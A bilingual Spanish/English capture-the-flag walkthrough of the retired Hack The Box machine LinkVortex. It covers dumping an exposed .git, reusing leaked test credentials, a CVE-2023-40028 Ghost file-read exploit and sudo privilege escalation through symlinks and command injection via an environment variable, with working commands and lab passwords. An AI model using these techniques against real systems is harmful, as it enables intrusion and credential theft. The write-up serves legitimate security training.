# LinkVortex [Easy]

> **ES:** Máquina Linux Easy con Ghost CMS y vhost de desarrollo que expone `.git`; credenciales en historial, LFI autenticado (CVE-2023-40028) y privesc con symlink + sudo.
> **EN:** Easy Linux box with Ghost CMS and a dev vhost exposing `.git`; creds in history, authenticated file read (CVE-2023-40028), and symlink + sudo privesc.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/LinkVortex] |
| **URL** | https://app.hackthebox.com/machines/LinkVortex |
| **IP lab** | 10.10.11.47 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía Ghost (login + file-read CVE-2023-40028) hasta SSH como `bob` y abuso de `clean_symlink.sh` con sudo.
> **EN:** Get `user.txt` and `root.txt` via Ghost (login + file read CVE-2023-40028) to SSH as `bob` and abuse of `clean_symlink.sh` with sudo.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] ffuf (vhost + contenidos) / dirsearch
- [ ] GitHack / git-dumper (dump de `.git` expuesto)
- [ ] Exploit público CVE-2023-40028 (lectura de ficheros Ghost)
- [ ] ssh / sudo -l / getcap

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Solo 22 y 80; el HTTP redirige a `linkvortex.htb`. Añadir `linkvortex.htb` y `dev.linkvortex.htb` a `/etc/hosts`.
> **EN:** Only 22 and 80; HTTP redirects to `linkvortex.htb`. Add `linkvortex.htb` and `dev.linkvortex.htb` to `/etc/hosts`.

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.47
echo '10.10.11.47 linkvortex.htb dev.linkvortex.htb' | sudo tee -a /etc/hosts
```

**Resultado / Result:** 22/tcp OpenSSH 8.9p1, 80/tcp Apache + Ghost. Captura de la home en `images/` (`images/Pasted image 20241209030223.png`).

---

### Paso 2 — Enumeración / Enumeration

> **ES:** `ffuf` de contenidos halla `robots.txt` (niega `/ghost/ /p/ /email/ /r/`), `LICENSE` (Ghost Foundation), `sitemap.xml` y login en `/ghost/#/signin` (Ghost 5.58). El fuzz de vhosts halla `dev`; en `dev` hay `.git/HEAD` accesible → volcarlo (GitHack/git-dumper, con pérdida parcial de objetos). En el dump: `Dockerfile.ghost` (confirma `FROM ghost:5.58.0`) y `ghost/core/test/regression/api/admin/authentication.test.js` con credenciales de prueba (`test@example.com : OctopiFociPilfer45`, más `thisissupersafe`, `lel123456`).
> **EN:** Content `ffuf` finds `robots.txt` (denies `/ghost/ /p/ /email/ /r/`), `LICENSE` (Ghost Foundation), `sitemap.xml` and login at `/ghost/#/signin` (Ghost 5.58). Vhost fuzzing finds `dev`; `dev` exposes `.git/HEAD` → dump it (GitHack/git-dumper, with partial object loss). In the dump: `Dockerfile.ghost` (confirms `FROM ghost:5.58.0`) and `ghost/core/test/regression/api/admin/authentication.test.js` with test creds (`test@example.com : OctopiFociPilfer45`, plus `thisissupersafe`, `lel123456`).

```bash
ffuf -u http://linkvortex.htb/FUZZ -w common.txt
# vhost fuzz -> dev (200)
ffuf -u http://dev.linkvortex.htb/FUZZ  # .git/HEAD -> 200
python3 GitHack.py http://dev.linkvortex.htb/.git/
# alternativa: git-dumper http://dev.linkvortex.htb/.git/ ./git-repo-dump
grep -R "password" dev.linkvortex.htb/ 2>/dev/null
# ghost/core/test/regression/api/admin/authentication.test.js:
#   const email = 'test@example.com'; const password = 'OctopiFociPilfer45';
```

**Resultado / Result:** Credencial `OctopiFociPilfer45` válida para el panel `/ghost/` (usuario `admin@linkvortex.htb`). Capturas del login y del test en `img/` (`img/image_20250401-090147.png`, `img/image_20250402-090205.png`, `img/image_20250457-085756.png`) y en `images/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Login en Ghost y lectura arbitraria de ficheros (CVE-2023-40028, symlink en import de contenido) para obtener `/var/lib/ghost/config.production.json` (ruta vista en el `Dockerfile.ghost`), que contiene credenciales SMTP de `bob` → reutilizar en SSH.
> **EN:** Log in to Ghost and perform arbitrary file read (CVE-2023-40028, symlink in content import) to fetch `/var/lib/ghost/config.production.json` (path seen in `Dockerfile.ghost`), holding `bob`'s SMTP creds → reuse over SSH.

```bash
./CVE-2023-40028.sh -u admin@linkvortex.htb -p 'OctopiFociPilfer45'
# WELCOME TO THE CVE-2023-40028 SHELL
# file> /etc/passwd   (node:x:1000:1000::/home/node:/bin/bash)
# file> /var/lib/ghost/config.production.json
# ..."mail": {... "auth": {"user": "bob@linkvortex.htb", "pass": "fibber-talented-worth"}}
ssh bob@linkvortex.htb  # pass: fibber-talented-worth (credencial de laboratorio retirado)
whoami; id  # bob
```

**Resultado / Result:** Acceso SSH como `bob`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Leer `user.txt` del home de `bob` (flag no publicada).
> **EN:** Read `user.txt` from `bob`'s home (flag not published).

```bash
ls -la /home/bob/
cat /home/bob/user.txt  # formato: 5dba... (ofuscado)
```

**Resultado / Result:** `user.txt` leído.

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite `(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` con `env_keep+=CHECK_CONTENT`. El script exige arg `*.png`, comprueba symlink, borra el link si el target matchea `(etc|root)` y si no lo mueve a `/var/quarantined/` mostrando su contenido con `cat` si `CHECK_CONTENT` es truthy. Dos abusos (credenciales/flags de laboratorio retirado): (a) doble symlink (`flag → /root/root.txt`, `flag.png → flag`) que evade el grep + `CHECK_CONTENT=true` para leer directo; (b) symlink intermedio + `CHECK_CONTENT='/bin/cat /root/.ssh/id_rsa'` (el `[ -z $CHECK_CONTENT ]` sin comillas ejecuta el contenido) para exfiltrar la clave de root y entrar por SSH.
> **EN:** `sudo -l` allows `(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png` with `env_keep+=CHECK_CONTENT`. The script requires a `*.png` arg, checks symlink, deletes the link if the target matches `(etc|root)`, else moves it to `/var/quarantined/` printing content with `cat` if `CHECK_CONTENT` is truthy. Two abuses (retired-lab creds/flags): (a) double symlink (`flag → /root/root.txt`, `flag.png → flag`) bypassing the grep + `CHECK_CONTENT=true` for direct read; (b) intermediate symlink + `CHECK_CONTENT='/bin/cat /root/.ssh/id_rsa'` (unquoted `[ -z $CHECK_CONTENT ]` executes the content) to exfiltrate root's key and SSH in.

```bash
sudo -l
cat /opt/ghost/clean_symlink.sh  # 745, root:root; QUAR_DIR="/var/quarantined"
getcap -r / 2>/dev/null  # solo ping; SUID estándar
# --- variante (a): doble symlink (evade grep etc|root) ---
ln -s /root/root.txt flag
ln -s /home/bob/flag flag.png
sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
# Link found [flag.png], moving it to quarantine / Content: 6605... (ofuscado)
# --- variante (b): exfiltrar id_rsa de root vía env ---
ln -s witherwither.png /tmp/wither.png
ln -s /root/.ssh/id_rsa /tmp/witherwither.png
export CHECK_CONTENT='/bin/cat /root/.ssh/id_rsa'
sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /tmp/wither.png
# -----BEGIN OPENSSH PRIVATE KEY----- ... (clave de laboratorio retirado, ofuscada aquí)
ssh -i id_rsa root@linkvortex.htb
cat /root/root.txt  # formato: 6605... (ofuscado)
```

**Resultado / Result:** Root por symlink + sudo NOPASSWD con env heredada. Técnica: symlink race/limpieza insegura + command injection vía `CHECK_CONTENT`.

---

## 🧠 Lo aprendido / Learned

> **ES:** Riesgo de exponer `.git` en dev; credenciales en tests/Docker; LFI autenticado en Ghost; privesc con scripts sudo que siguen symlinks y variables de entorno heredadas.
> **EN:** Risk of exposing `.git` on dev; creds in tests/Docker; authenticated file read on Ghost; privesc via sudo scripts following symlinks and inherited env vars.

- [ ] Vhost fuzzing + GitHack
- [ ] CVE-2023-40028 (Ghost file read)
- [ ] Abuso de `clean_symlink.sh` + `CHECK_CONTENT`

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `index.md` (notas propias en chino/inglés, con capturas en `img/`) — randark/nota migrada
- **Walkthrough de referencia:** Nota previa en inglés `Walkthrough.md` (legacy: ffuf/robots, `Dockerfile.ghost`, `config.production.json`, script `clean_symlink.sh` completo, exfiltración `id_rsa`) — wither/nota migrada
- **Referencia técnica:** CVE-2023-40028 (Ghost arbitrary file read) — https://nvd.nist.gov/vuln/detail/CVE-2023-40028 — NIST NVD
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
